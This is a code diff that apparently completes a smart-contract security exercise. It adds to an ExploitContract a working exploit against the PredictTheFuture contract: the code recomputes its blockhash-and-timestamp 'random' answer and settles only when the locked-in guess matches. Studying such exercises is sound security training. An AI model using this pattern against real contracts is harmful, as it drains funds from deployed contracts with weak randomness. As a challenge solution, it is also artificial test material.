@@ -48,10 +48,36 @@ contract PredictTheFuture {
 
 contract ExploitContract {
     PredictTheFuture public predictTheFuture;
+    uint8 guess;
 
     constructor(PredictTheFuture _predictTheFuture) {
         predictTheFuture = _predictTheFuture;
     }
 
     // Write your exploit code below
+    function lockInGuess() public payable {
+        guess = 1;
+        predictTheFuture.lockInGuess{value: 1 ether}(guess);
+    }
+
+    function exploit() public {
+        uint8 answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        ) % 10;
+
+        if (answer == guess) {
+            predictTheFuture.settle();
+        }
+    }
+
+    receive() external payable {}
+
+    fallback() external payable {}
 }
